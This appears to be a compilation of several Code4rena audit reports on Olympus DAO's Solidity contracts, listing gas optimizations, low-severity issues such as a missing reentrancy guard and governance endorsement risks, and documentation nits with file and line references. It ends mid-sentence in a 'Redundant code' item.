# [G-01] Prefix increment costs less gas than postfix increment  There are 7 instances of this issue.  ``` File: src/policies/Operator.sol 488: decimals++; 670: _status.low.count++; 675: _status.low.count--; 686: _status.high.count++; 691: _status.high.count--; ```  ``` File: src/utils/KernelUtils.sol 49: i++; 64: i++; ```  # [G-02] Cache the length of the array before the loop  There is 1 instance of this issue.  ``` File: src/policies/Governance.sol 278: for (uint256 step; step < instructions.length; ) { ```  # [G-03] Initializing a variable with the default value wastes gas  There are 3 instances of this issue.  ``` File: src/Kernel.sol 397: for (uint256 i = 0; i < reqLength; ) { ```  ``` File: src/utils/KernelUtils.sol 43: for (uint256 i = 0; i < 5; ) { 58: for (uint256 i = 0; i < 32; ) { ```  # [G-04] Use != 0 instead of > 0 to save gas.  Replace `> 0` with `!= 0` for unsigned integers.  On the instance bellow `userVotesForProposal` is a nested mapping of uints.  ``` File: src/policies/Governance.sol 247: if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) { ```  # [G-05] Use right/left shift instead of division/multiplication to save gas  There are 5 instances of this issue.  ``` File: src/policies/Operator.sol 372: int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2); 419: uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price; 420: uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price; 427: int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2); 786: ) * (FACTOR_SCALE + RANGE.spread(true) * 2)) / ```  # [G-06] Don’t compare boolean expressions to boolean literals  There are 2 instances of this issue.  ``` File: src/policies/Governance.sol 223: if (proposalHasBeenActivated[proposalId_] == true) { 306: if (tokenClaimsForProposal[proposalId_][msg.sender] == true) { ```  # [G-07] x += y costs more gas than x = x + y for state variables  There is 1 instance of this issue in `Price.sol` and 2 instances in `TRSRY.sol`  ``` File: src/modules/PRICE.sol 136: _movingAverage += (currentPrice - earliestPrice) / numObs; ```  ``` File: main/src/modules/TRSRY.sol 96: reserveDebt[token_][msg.sender] += amount_; 97: totalDebt[token_] += amount_; ```  # [G-08] Using private rather than public for constants, saves gas  The values can still be inspected on the source code if necessary.  There are 9 instances of this issue.  ``` File: src/modules/PRICE.sol 59: uint8 public constant decimals = 18; ```  ``` File: src/modules/RANGE.sol 65: uint256 public constant FACTOR_SCALE = 1e4; ```  ``` File: src/policies/Governance.sol 121: uint256 public constant SUBMISSION_REQUIREMENT = 100; 124: uint256 public constant ACTIVATION_DEADLINE = 2 weeks; 127: uint256 public constant GRACE_PERIOD = 1 weeks; 130: uint256 public constant ENDORSEMENT_THRESHOLD = 20; 133: uint256 public constant EXECUTION_THRESHOLD = 33; 137: uint256 public constant EXECUTION_TIMELOCK = 3 days; ```  ``` File: src/policies/Operator.sol 89: uint32 public constant FACTOR_SCALE = 1e4; ``` 
# [L-01] Missing nonReentrant for function not using checks-effects-interactions  The `batchToTresury` function has access control, but it's updating the state after external calls. Consider adding a `nonReetrancy` modifier.  ``` File: src/policies/BondCallback.sol function batchToTreasury(ERC20[] memory tokens_) external onlyRole("callback_admin") {     ERC20 token;     uint256 balance;     uint256 len = tokens_.length;     for (uint256 i; i < len; ) {         token = tokens_[i];         balance = token.balanceOf(address(this));         token.safeTransfer(address(TRSRY), balance);         priorBalances[token] = token.balanceOf(address(this));          unchecked {             ++i;         }     } } ```  # [L-02] Missing zero address checks for setters  Consider adding checks against zero address when a function is receiving an input address.  ``` File: main/src/modules/TRSRY.sol 64: function setApprovalFor( 122: function setDebt( ```  # [NC-01] Non library files should use fixed compiler verion  Locking the pragma helps to ensure that contracts do not accidentally get deployed using an outdated compiler version. Note that pragma statements can be allowed to float when a contract is intended for consumption by other developers, as in the case with contracts in a library or a package.  There are 3 instances of this issue.  ``` File: src/interfaces/IBondCallback.sol 2: pragma solidity >=0.8.0; ```  ``` File: src/policies/interfaces/IHeart.sol 2: pragma solidity >=0.8.0; ```  ``` File: src/policies/interfaces/IOperator.sol 2: pragma solidity >=0.8.0; ```  # [NC-02] Public functions not called by the contract should be declared external  There are 2 instances of this issue  ``` File: src/policies/Governance.sol 151: function getActiveProposal() public view returns (ActivatedProposal memory) { 145: function getMetadata(uint256 proposalId_) public view returns (ProposalMetadata memory) { ```  # [NC-03] Missing NATSPEC  Consider adding NATSPEC on all functions to enhance the project documentation.  ``` File: src/policies/Governance.sol 61: function configureDependencies() external override returns (Keycode[] memory dependencies) { 70: function requestPermissions() ```  # [NC-04] Lack of event when kernel grants or revoke status  Consider emitting an event when `setActiveStatus` is called to facilitate monitoring of the system.  ``` File: main/src/modules/TRSRY.sol 126: function setActiveStatus(bool activate_) external onlyKernel { ```  # [NC-05] TODOs should should be resolved before deployment  There are 4 instances of this issue.  ``` File: src/policies/Operator.sol 657: /// TODO determine if this should use the last price from the MA or recalculate the current price, ideally last price is ok since it should have been just updated and should include check against secondary? ```  ``` File: src/policies/TreasuryCustodian.sol 51: // TODO Currently allows anyone to revoke any approval EXCEPT activated policies. 52: // TODO must reorg policy storage to be able to check for deactivated policies. 56: // TODO Make sure `policy_` is an actual policy and not a random address. ``` 
 ## Summary  G-01 Using calldata instead of memory for read-only arguments in external functions saves gas (1 instance) G-02 <x> += <y> costs more gas than <x> = <x> + <y> for state variables (12 instances) G-03 internal functions only called once can be inlined to save gas (2 instances) G-04 Using bools for storage incurs overhead (11 instances) G-05 Using > 0 costs more gas than != 0 when used on a uint in a require() statement (1 instance0 G-06 ++i costs less gas than i++, especially when it’s used in for-loops  (2 instances) G-07 Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead (88 instances) G-08 Using private rather than public for constants, saves gas (9 instances) G-09 Empty blocks should be removed or emit something (2 instances)  G-10 calldata instead of memory for read-only function parameter (5 instances)  Total: 133 instances in 10 issues   ## G-01 Using calldata instead of memory for read-only arguments in external functions saves gas When a function with a memory array is called externally, the abi.decode() step has to use a for-loop to copy each index of the calldata to the memory index. Each iteration of this for-loop costs at least 60 gas (i.e. 60 * <mem_array>.length). Using calldata directly, obliviates the need for such a loop in the contract code and runtime execution. Structs have the same overhead as an array of length one  1 instance in 1 file: https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L162   ## G-02 <x> += <y> costs more gas than <x> = <x> + <y> for state variables  12 instances in 5 files:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L96 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L97 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L131  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L136 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L222  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L58  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L143 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L144  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L198 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L252 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L254   ## G-03 internal functions only called once can be inlined to save gas  Not inlining costs 20 to 40 gas because of two extra JUMP instructions and additional stack operations needed for function calls.  2 instances in 2 files:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L391-395  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L137-L141   ## G-04 Using bools for storage incurs overhead  Booleans are more expensive than uint256 or any type that takes up a full word because each write operation emits an extra SLOAD to first read the slot's contents, replace the bits taken up by the boolean, and then write back. This is the compiler's defense against contract upgrades and pointer aliasing, and it cannot be disabled. https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27 Use uint256(1) and uint256(2) for true/false  11 instances in 5 files:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L113 https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L181 https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L194 https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L197  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L62  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L63 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L66  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L24  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L33  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L105 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L117   ## G-05 Using > 0 costs more gas than != 0 when used on a uint in a require() statement  This change saves 6 gas per instance  1 instance in 1 file:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L247   ## G-06 ++i costs less gas than i++, especially when it’s used in for-loops (--i/i-- too)  Saves 6 gas PER LOOP  2 instances in 1 file:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L49 https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L64   ## G-07 Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size. https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html Use a larger size then downcast where needed  88 instances in 10 files:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L100  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L51  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L25  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L45 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L115 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L148 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L200  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L27 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L28 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L44 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L47 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L50 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L53 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L56 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L75 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L76 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L84 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L87 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L97 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L113 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L127 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L185 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L240 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L266 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L289  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L27  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L28  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L51 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L52 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L53 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L54 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L83 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L86 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L97 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L108 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L116 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L127 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L128 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L129 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L210 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L216 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L375 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L376 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L377 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L403 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L404 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L418 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L455 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L456 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L528 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L529 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L530 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L535 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L536 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L548 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L560 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L561 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L562 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L665 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L705 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L707 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L708 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L717 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L719 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L720  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L45 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L58 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L69  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L13 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L14 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L15 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L16 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L17 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L18 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L19 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L20 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L31 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L32 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L33 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L85 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L93 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L94 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L95 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L101 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L110 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L111 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L112   ## G-08 Using private rather than public for constants, saves gas If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table  9 instances in 4 files:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L65  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L121 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L124 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L127 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L130 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L133 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L137    ## G-09 Empty blocks should be removed or emit something  The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting. If the contract is meant to be extended, the contract should be abstract and the function signatures be added without any default implementation. If the block is an empty if-statement block to avoid doing subsequent checks in the else-if/else conditions, the else-if/else conditions should be nested under the negation of the if-statement, because they involve different classes of checks, which may lead to the introduction of errors when the code is later modified (if(x){}else if(y){...}else{...} => if(!x){if(y){...}else{...}})  2 instances in 1 file:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L139 https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L143   ## G-10 calldata instead of memory for read-only function parameter  If a reference type function parameter is read-only, it is cheaper in gas to use calldata instead of memory. Calldata is a non-modifiable, non-persistent area where function arguments are stored, and behaves mostly like memory. Try to use calldata as a data location because it will avoid copies and also makes sure that the data cannot be modified.  5 instances in 3 files:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L139 https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L143 https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L393  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L205  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L53 
## [L-01]: Upgrades to `VOTES` module can lead to governance vulnerabilities The comment in [VOTES.sol#L10](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L10): ``` /// @dev    This is currently a substitute module that stubs gOHM. ``` means that the `VOTES` module is temporary and will be replaced by a form of governance token (could be staked gOHM for example). One must be sure before upgrading that the new token does not present a `transfer` function nor any mechanism or bypass that effectively allows to transfer tokens in between addresses. If the contrary is true, it would lead to a double endorsing issue (possibility to call [`OlympusGovernance.endorseProposal()`](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L181) a second time after getting the same tokens to a different address). Note that a bypass that allows transfer of tokens without delay could be used by an attacker to get unlimited endorsement power and execute a DoS on the governance by frontrunning calls to `activateProposal()` with a self-endorsed proposal.  ## [L-02]: Voting temporarily reduces endorsing power When calling `vote()` on the governance, `VOTES` token are transfered temporarily to the governance contract ([Governance.sol#L259](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L259)), so one must wait before being able to endorse a  proposal again.  ## [L-03]: Missing events for critical changes in system parameters Change of critical system parameters should come with an event emission to allow for monitoring of potentially dangerous or malicious changes. Occurrencies of this issue are [Kernel.sol#L77](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L77), [Kernel.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L127), [BondCallback.sol#L190](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L190)  ## [L-04]: `executor` can become also `admin` At [Kernel.sol#L253](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L253) the `executor` is allowed to become also `admin` of the `Kernel`. Consider checking that the `admin` set is not the `executor` (and vice versa at [Kernel.sol#L251](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L251)) to avoid full centralization of the system.  ## [L-05]: Open `TODO`s Open TODOs can point to architecture or programming issues that still need to be resolved. Occurrencies at [TreasuryCustodian.sol#L51-L56](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/TreasuryCustodian.sol#L51-L56), [Operator.sol#L657](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L657). All issues raised in TODOs should be addressed before deployment.  ## [NC-01]: Missing/Incomplete/Incorrect Natspec comments:  - missing Natspec comments for public / external functions:   - [TRSRY.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L59)   - [MINTR.sol#L33](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/MINTR.sol#L33)   - [MINTR.sol#L37](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/MINTR.sol#L37)   - [VOTES.sol#L35](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L35)   - [VOTES.sol#L39](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L39)   - [Governance.sol#L61](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L61)   - [Governance.sol#L70](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L70)  - missing Natspec comments for public getters:    - [Kernel.sol#L63](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L63)   - [MINTR.sol#L9](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/MINTR.sol#L9)   - [RANGE.sol#L65](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L65)   - [BondCallback.sol#L24-L26](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L24-L26)   - [Governance.sol#L56-L57](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L56-L57)   - [Operator.sol#L83](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L83)   - [Operator.sol#L86](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L86)   - [Operator.sol#L89](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L89)    - missing function parameters:   - [Kernel.sol#L75](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L75)   - [Kernel.sol#L126](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L126)   - [Kernel.sol#L234](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L234)   - [INSTR.sol#36](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L36)   - [INSTR.sol#42](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L42)   - [TRSRY.sol#L63](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L63)   - [TRSRY.sol#L74](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L74)   - [TRSRY.sol#L92](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L92)   - [TRSRY.sol#L105](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L105)   - [TRSRY.sol#L121](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L121)   - [VOTES.sol#L45](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L45)   - [VOTES.sol#L50](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L50)   - [Governance.sol#L144](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L144)  - missing function return values   - [INSTR.sol#42](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L42)   - [RANGE.sol#L274](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L274)   - [RANGE.sol#L279](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L279)   - [RANGE.sol#L289](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L289)   - [RANGE.sol#L300](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L300)   - [RANGE.sol#L318](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L318)   - [RANGE.sol#L329](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L329)   - [RANGE.sol#L339](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L339)   - [Governance.sol#L144](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L144)   - [Governance.sol#L150](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L150)   - [IHeart.sol#L17](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/interfaces/IHeart.sol#L17)   - [IOperator.sol#L143](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/interfaces/IOperator.sol#L143)  - incorrect comments:   - [Kernel.sol#L167](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L167): should be `Mapping of keycode to module address`   - [Kernel.sol#L170](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L170): should be `Mapping of keycode to module address`   - [Kernel.sol#L180](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L180): `Policy` and `Keycode` should be inverted   Consider adding missing Natspec comments according to the relevant [section](https://docs.soliditylang.org/en/v0.8.16/natspec-format.html#natspec) in the solidity docs.  ## [NC-02]: Redundant code: At 